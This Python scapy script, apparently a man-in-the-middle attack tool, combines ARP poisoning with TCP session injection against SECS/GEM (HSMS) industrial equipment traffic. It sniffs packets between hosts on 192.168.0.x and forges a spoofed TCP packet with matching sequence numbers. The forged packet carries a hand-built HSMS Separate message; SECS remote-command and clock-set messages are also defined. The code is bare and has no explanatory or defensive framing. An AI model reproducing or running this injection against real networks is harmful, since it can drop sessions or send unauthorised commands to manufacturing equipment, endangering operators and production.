from scapy.all import *
from test01 import ArpPoison
from threading import Thread
from time import sleep

arpPoison = ArpPoison()
        

def callback(pkt):

    previousPacket = pkt[TCP]
    ether = Ether()
    ether.dst = SERVER_MAC
    ether.src = MIDDLE_MAC
    # print(pkt[IP].src)
    # print(pkt[Ether].dst)
    if pkt[Ether].src[4] == 'c' and pkt[Ether].dst[4] == 'c' and pkt[IP].src == "192.168.0.10":
        if pkt[IP].len == 0x36:
            # print(pkt[Raw].load)
            if pkt[Raw].load[9] == 0x6:
                ip = IP(src = "192.168.0.11", dst = "192.168.0.10")
                newAck = previousPacket.seq + pkt[IP].len - 0x28
                tcp = TCP(sport = 5000, dport = previousPacket.sport, seq = previousPacket.ack, ack = newAck, flags = "AP")
                toSend = ip/tcp/payload1
                send(toSend)

            

if __name__ == "__main__":
    SERVER_MAC = "00:0C:29:E9:42:B4"
    MIDDLE_MAC = "00:0E:C6:78:0E:A0"
    S2F41_REMOTE_1 = b'\x00\x00\x00\x19' 
    S2F41_REMOTE_1 += b'\x00\x00\x82\x29' 
    S2F41_REMOTE_1 += b'\x00\x00\x24\x97\x91\x96'
    
    S2F41_REMOTE_2 = b'\x01\x02\x41\x09'
    S2F41_REMOTE_2 += b'\x67\x6F\x5F\x72'
    S2F41_REMOTE_2 += b'\x65\x6D\x6F\x74'
    S2F41_REMOTE_2 += b'\x65\x01\x00'

    S2F31_DATETIMESET_1 = b'\x00\x00\x00\x1C'
    S2F31_DATETIMESET_1 += b'\x00\x00\x82\x1F'
    S2F31_DATETIMESET_1 += b'\x00\x00\x48\x57\xE4\x64'

    S2F31_DATETIMESET_2 = b'\x41\x10'
    S2F31_DATETIMESET_2 += b'\x32\x30\x31\x34'  #2014
    S2F31_DATETIMESET_2 += b'\x30\x38\x31\x37'
    S2F31_DATETIMESET_2 += b'\x31\x31\x32\x32\x33\x33\x30\x30'

    SEPARATE = b'\x00\x00\x00\x0A'
    SEPARATE += b'\xFF\xFF\x00\x00'
    SEPARATE += b'\x00\x09\xC3\x7B\xCB\x31'

    payload1 = SEPARATE
    payload2 = S2F41_REMOTE_2

    sniff(filter = "tcp", prn = callback, iface = "以太网 2")